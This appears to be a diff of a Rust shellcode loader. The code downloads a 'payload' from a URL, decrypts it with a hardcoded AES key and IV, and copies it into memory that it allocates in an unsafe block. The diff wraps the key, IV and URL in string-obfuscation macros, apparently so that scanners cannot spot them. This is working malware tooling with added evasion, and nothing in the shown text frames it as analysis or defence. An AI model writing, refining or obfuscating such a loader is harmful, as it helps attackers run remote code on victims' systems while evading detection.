@@ -13,10 +13,10 @@ const AESIV: &str  = "8y/B?E(G+KbPeShV";
 fn decrypt(data: &[u8], size: usize) -> Vec<u8> {
     let mut key = [0x42; 16];
     let mut iv = [0x24; 16];
-    for (i, b) in AESKEY.as_bytes().iter().enumerate() {
+    for (i, b) in obfstr::obfstr!(AESKEY).as_bytes().iter().enumerate() {
         key[i] = *b;
     }
-    for (i, b) in AESIV.as_bytes().iter().enumerate() {
+    for (i, b) in obfstr::obfstr!(AESIV).as_bytes().iter().enumerate() {
         iv[i] = *b;
     }
     let mut buf: Vec<u8> = Vec::with_capacity(size);
@@ -49,7 +49,7 @@ fn getscode(url: &str) -> Bytes {
 
 fn dne() -> Result<(), region::Error> {
     //download the payload
-    let rbytes = getscode(URL);
+    let rbytes = getscode(obfstr::obfstr!(URL));
     // allocate and copy
     unsafe {
         //allocate
